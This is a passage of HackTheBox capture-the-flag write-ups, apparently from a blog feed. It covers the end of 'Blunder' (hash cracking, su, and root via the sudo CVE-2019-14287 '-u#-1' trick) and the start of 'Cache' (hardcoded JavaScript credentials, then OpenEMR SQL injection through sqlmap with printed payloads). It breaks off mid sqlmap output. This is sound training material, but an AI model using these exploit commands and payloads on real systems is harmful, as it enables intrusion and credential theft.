class="line">drwxr-xr-x 16 shaun shaun 4096 Apr 28 12:13 shaun</span><br><span class="line">www-data@blunder:/$ ls -l /home/hugo</span><br><span class="line">-r-------- 1 hugo hugo   33 Jun 20 20:19 user.txt</span><br></pre></td></tr></table></figure><p>Searching for <code>Hugo</code> string returns an entry from <code>databases/users.php</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/var/www$ grep -ri <span class="string">&quot;hugo&quot;</span></span><br><span class="line">grep -ri <span class="string">&quot;hugo&quot;</span></span><br><span class="line">bludit-3.10.0a/bl-content/databases/users.php:        <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">bludit-3.10.0a/bl-content/databases/users.php:        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br></pre></td></tr></table></figure><p>Let’s take a look at it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php</span><br><span class="line">&lt;?php defined(<span class="string">&#x27;BLUDIT&#x27;</span>) or die(<span class="string">&#x27;Bludit CMS.&#x27;</span>); ?&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;User&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;registered&quot;</span>: <span class="string">&quot;2019-11-27 07:40:55&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenRemember&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuth&quot;</span>: <span class="string">&quot;b380cb62057e9da47afce66b4615107d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuthTTL&quot;</span>: <span class="string">&quot;2009-03-15 14:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;twitter&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;facebook&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;instagram&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;codepen&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linkedin&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;github&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gitlab&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Bingo! We have what looks like a SHA1 hashed password. Unfortunately <code>john</code> can not seems to crack it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt hugohash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 128/128 AVX 4x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=2</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:01 DONE (2020-06-20 21:42) 0g/s 12581Kp/s 12581Kc/s 12581KC/sie168..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Being sure to be on the right track I checked online on <code>https://md5decrypt.net/en/Sha1/</code> website which managed to find it: <code>faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120</code>.</p><p>Since SSH is not open let’s try to use <code>su</code> to change to <code>Hugo</code> user:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/var/www$ su - hugo</span><br><span class="line">su - hugo</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">hugo@blunder:~$ id</span><br><span class="line">uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)</span><br><span class="line">hugo@blunder:~$ cat user.txt</span><br><span class="line">1xxxxxxxxxxxxxxxxxxxxx0</span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The first thing I like to check for privilege escalation to root is the <code>sudo</code> config. It’s very often a good entry-point. This box was no exception and got an interesting config I never saw before:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:/$ sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line">[...]</span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure><p>This configuration of <code>sudo</code> is meant to allows a user to run a command as any user except root. Well that’s a bummer for what we need. </p><h3 id="Sudo-Exploit"><a href="#Sudo-Exploit" class="headerlink" title="Sudo Exploit"></a>Sudo Exploit</h3><p>Yet it’s worth digging a bit more because after a bit of search on this configuration we stumble upon <a href="https://access.redhat.com/security/cve/cve-2019-14287">CVE-2019-14287</a>:</p><blockquote><p>A flaw was found in the way sudo implemented running commands with  arbitrary user ID. If a sudoers entry is written to allow the attacker  to run a command as any user except root, this flaw can be used by the  attacker to bypass that restriction.</p></blockquote><p>That’s exactly what we need. To summary, <code>sudo</code> check user ID being passed incorrectly and convert it to <code>-1</code>, or its unsigned equivalent <code>4294967295</code> user ID as <code>0</code>, which is always the user ID of root user. </p><p>Let’s see if the version running on the box is vulnerable:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:/$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">root@blunder:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line">3xxxxxxxxxxxxxxxxxxxxd</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> Blunder </tag>
            
            <tag> bludit cms </tag>
            
            <tag> CVE-2019-17240 </tag>
            
            <tag> cewl </tag>
            
            <tag> upload restriction bypass </tag>
            
            <tag> htaccess </tag>
            
            <tag> CVE-2019-16113 </tag>
            
            <tag> SHA1 </tag>
            
            <tag> sudo </tag>
            
            <tag> CVE-2019-14287 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Cache</title>
      <link href="/posts/cache/"/>
      <url>/posts/cache/</url>
      
        <content type="html"><![CDATA[<img width="578" alt="cache-hackthebox" src="https://user-images.githubusercontent.com/9076747/82154005-53054b80-986b-11ea-8ecb-557395356efb.png"><p>Cache just retired on Hackthebox, it’s a medium difficulty Linux box. This box was quite fun to solve and required to use a ton of vulnerabilities. This box actually made me worried a little about the state of security in some medical web tools haha. </p><p><strong>Tl;Dr:</strong> To get the user flag you had to exploit an unauthenticated SQL Injection in a HMS (hospital management system) web app in order to retrieve the app admin hash. Once cracked you can use an authenticated remote code execution exploit to get a shell as <code>www-data</code>. Using credentials found on the first website you pivot to <code>ash</code> user and get the flag.<br>To get the root flag you first have to pivot to <code>luffy</code> user by extracting its password from a <code>memcached</code> instance. From <code>luffy</code> account you exploit a vulnerability in docker to achieve arbitrary file read and get a root shell. </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.188 cache.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC cache.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> cache.htb (10.10.10.188)</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.49 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80 and the SSH port 22 open.</p><p>Opening <a href="http://cache.htb/">http://cache.htb</a> display a following page:</p><img width="867" alt="cache homepage" src="https://user-images.githubusercontent.com/9076747/82216317-17c15600-9919-11ea-8049-cda2aa596e9c.png"><p>Since most pages are static let’s focus on the <code>Login</code> page. </p><h3 id="Ash-credentials"><a href="#Ash-credentials" class="headerlink" title="Ash credentials"></a>Ash credentials</h3><p>While trying to login with dummy credentials something immediately catch the eye:</p><p><img src="https://user-images.githubusercontent.com/9076747/82219741-fdd64200-991d-11ea-9775-21fec8bff797.gif" alt="cache-login"></p><p>Well that’s a quite fast error message, looks like it doesn’t even make a request to the server to check the credentials…</p><p>Looking at the page source confirms our suspicions. A Javascript file is used to check on credentials in <code>jquery/functionality.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> error_username = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectPassword</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Password != <span class="string">&#x27;H@v3_fun&#x27;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Password didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_correctPassword = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectUsername</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Username != <span class="string">&quot;ash&quot;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Username didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_username = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&quot;#loginform&quot;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* Act on the event */</span></span><br><span class="line">        error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectPassword();</span><br><span class="line">         error_username = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectUsername();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(error_correctPassword == <span class="literal">false</span> &amp;&amp; error_username ==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>This explains why the error message was so fast to appear. Also we got credentials: <code>ash</code>:<code>H@v3_fun</code>. Let’s login using those:</p><img width="867" alt="cache login net" src="https://user-images.githubusercontent.com/9076747/82220173-95d42b80-991e-11ea-9de5-54a00febb11e.png"><p>Bummer nothing there. Let’s continue our investigation.</p><h3 id="HMS-Hospital-Management-System"><a href="#HMS-Hospital-Management-System" class="headerlink" title="HMS (Hospital Management System)"></a>HMS (Hospital Management System)</h3><p>While navigating the website, the <code>author.html</code> page informs us of an interesting information:</p><blockquote><p>ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:</p><p>HMS(Hospital Management System)<br>[…]</p></blockquote><p>Maybe the <code>HMS</code> project is available on this server. Let’s add the <code>hms</code> subdomain to our file to see if we can access it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.188 hms.cache.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">[hg8@archbook ~]$ curl hms.cache.htb</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 18 May 2020 13:59:28 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Last-Modified: Wed, 06 May 2020 09:03:19 GMT</span><br><span class="line">ETag: <span class="string">&quot;2001-5a4f70909088c&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 8193</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ curl cache.htb -I</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 18 May 2020 13:59:40 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Last-Modified: Wed, 06 May 2020 09:03:19 GMT</span><br><span class="line">ETag: <span class="string">&quot;2001-5a4f70909088c&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 8193</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text/html</span><br></pre></td></tr></table></figure><p>No luck it redirect to the main website. Maybe <code>hms.htb</code> then ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.188 hms.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Bingo! We have access to a new CMS called <code>OpenEMR</code>:</p><img width="867" alt="cache openemr login panel" src="https://user-images.githubusercontent.com/9076747/82221743-abe2eb80-9920-11ea-963b-38c7079bfa02.png"><p>Trying <code>ash</code> credentials doesn’t works, nor <code>openemr</code> default admin credentials.</p><p>Running <code>gobuster</code> yields a lot of results:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://hms.htb&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/admin.php (Status: 200)</span><br><span class="line">/ci (Status: 301)</span><br><span class="line">/cloud (Status: 301)</span><br><span class="line">/common (Status: 301)</span><br><span class="line">/config (Status: 301)</span><br><span class="line">/contrib (Status: 301)</span><br><span class="line">/controller.php (Status: 200)</span><br><span class="line">/controllers (Status: 301)</span><br><span class="line">/custom (Status: 301)</span><br><span class="line">/entities (Status: 301)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index.php (Status: 302)</span><br><span class="line">/interface (Status: 301)</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/library (Status: 301)</span><br><span class="line">/modules (Status: 301)</span><br><span class="line">/myportal (Status: 301)</span><br><span class="line">/patients (Status: 301)</span><br><span class="line">/portal (Status: 301)</span><br><span class="line">/public (Status: 301)</span><br><span class="line">/repositories (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/services (Status: 301)</span><br><span class="line">/setup.php (Status: 200)</span><br><span class="line">/sites (Status: 301)</span><br><span class="line">/sql (Status: 301)</span><br><span class="line">/templates (Status: 301)</span><br><span class="line">/tests (Status: 301)</span><br><span class="line">/vendor (Status: 301)</span><br><span class="line">/version.php (Status: 200)</span><br></pre></td></tr></table></figure><p>The <code>admin.php</code> page is interesting since it give us the OpenEMR version (<code>5.0.1 (3)</code>) :</p><img width="867" alt="cache openEMR admin page" src="https://user-images.githubusercontent.com/9076747/82301325-5bb76800-99b8-11ea-8877-440fe1183b2b.png"><p>This <code>5.0.1.3</code> is actually pretty old, let’s search online to see if we can find any vulnerabilities for this version:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit openemr</span><br><span class="line">------------------------------------------------------------ ----------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">                                                            | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------ ----------------------------------</span><br><span class="line">[...]</span><br><span class="line">OpenEMR 5.0.1.3 - (Authenticated) Remote Code Execution     | exploits/php/webapps/45161.py</span><br><span class="line">------------------------------------------------------------ ----------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Looks good! A RCE exploit, except it’s authenticated… We will need to first find a way to authenticate to OpenEMR in order to use this exploit. </p><p>Maybe we can try to relaunch the installation page at <code>setup.php</code> to reconfigure the site with our own credential? Unfortunately, this doesn’t work and we get an error message saying the website have already been configured. </p><p>It’s also not possible to add a new site… Then what ?</p><p>Let’s search a bit more, maybe we missed vulnerabilities. Searching for “<em>OpenEMR 5.0.1.3</em>“ on Google returns an interesting paper that wasn’t available through <code>searchploit</code>:</p><blockquote><p>ProjectInsecurity-insecurity.sh<br><strong>OpenEMR v5.0.1.3 - Vulnerability Report</strong></p><p><a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf</a></p></blockquote><p>This paper presents a quite impressive list of vulnerabilities affecting OpenEMR 5.0.1.3:</p><img width="668" alt="OpenEMR vulnerability list" src="https://user-images.githubusercontent.com/9076747/82302926-8e626000-99ba-11ea-9bc2-82560bb6af81.png"><p>Reading through the vulnerability list, we quickly understand that:</p><ul><li>All RCE vulnerability are authenticated</li><li>All Arbitrary File Read/Write are authenticated </li><li>CSRF to RCE is authenticated</li><li>Unrestricted File Upload are authenticated</li><li>All SQL Injection are authenticated</li></ul><p>At first it looks like we didn’t made a lot of progress here, but another vulnerability is worth checking : “<strong>Patient Portal Authentication Bypass</strong>“:</p><blockquote><p>An unauthenticated user is able to bypass the Patient Portal Login by simply navigating tothe registration page and modifying the requested url to access the desired page. Someexamples of pages in the portal directory that are accessible after browsing to theregistration page include:</p><ul><li>find_appt_popup_user.php</li><li>[…]</li></ul></blockquote><p>Well, this page is familiar isn’t ?</p><blockquote><p>SQL injection in find_appt_popup_user.php is caused by unsanitized user input from thecatid and providerid parameters.</p></blockquote><p>Linking the “<strong>Patient Portal Authentication Bypass</strong>“ and “<strong>SQL injection in find_appt_popup_user.php</strong>“ we should be able to retrieve database informations even while being unauthenticated. Let’s give a try.</p><h3 id="SQL-Injection-on-OpenEMR"><a href="#SQL-Injection-on-OpenEMR" class="headerlink" title="SQL Injection on OpenEMR"></a>SQL Injection on OpenEMR</h3><p>Heading to <code>http://hms.htb/portal/find_appt_popup_user.php</code> first redirects us to the Patient Login page. Since the Registration is open, we can create an account and browse back to <code>find_appt_popup_user.php</code>:</p><img width="896" alt="cache openemr find popup user" src="https://user-images.githubusercontent.com/9076747/82304337-7c81bc80-99bc-11ea-8c5c-59081c617820.png"><p>From there we can quickly validate the SQL injection possibility:</p><img width="896" alt="cache openemr sql injection" src="https://user-images.githubusercontent.com/9076747/82304465-aaff9780-99bc-11ea-81f4-e22b66e34270.png"><p>Let’s now use SQLMap to speed-up our injection process:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">&quot;http://hms.htb/portal/find_appt_popup_user.php?catid=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=fobps042o1oh4u325nqk3jnniv; OpenEMR=qsvth3m6bqdgnusejnn36bd1pe&quot;</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.4<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:41:00] [INFO] heuristic (basic) test shows that GET parameter &#x27;</span>catid<span class="string">&#x27; might be injectable (possible DBMS: &#x27;</span>MySQL<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[10:41:10] [INFO] GET parameter &#x27;</span>catid<span class="string">&#x27; is &#x27;</span>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:41:21] [INFO] GET parameter &#x27;</span>catid<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:41:41] [INFO] target URL appears to be UNION injectable with 1 columns</span></span><br><span class="line"><span class="string">GET parameter &#x27;</span>catid<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: catid (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: catid=1&#x27;</span> AND (SELECT 2341 FROM(SELECT COUNT(*),CONCAT(0x71706b6b71,(SELECT (ELT(2341=2341,1))),0x71716b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND <span class="string">&#x27;Mfzh&#x27;</span>=<span class="string">&#x27;Mfzh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: catid=1&#x27;</span> AND (SELECT 3684 FROM (SELECT(SLEEP(5)))YmTR) AND <span class="string">&#x27;ApVK&#x27;</span>=<span class="string">&#x27;ApVK</span></span><br><span class="line"><span class="string">---</span></span><br></pre></td></tr></table></figure><p>Let’s list the databases:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">&quot;http://hms.htb/portal/find_appt_popup_user.php?catid=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=fobps042o1oh4u325nqk3jnniv; OpenEMR=qsvth3m6bqdgnusejnn36bd1pe&quot;</span> --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.4<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:44:25] [INFO] 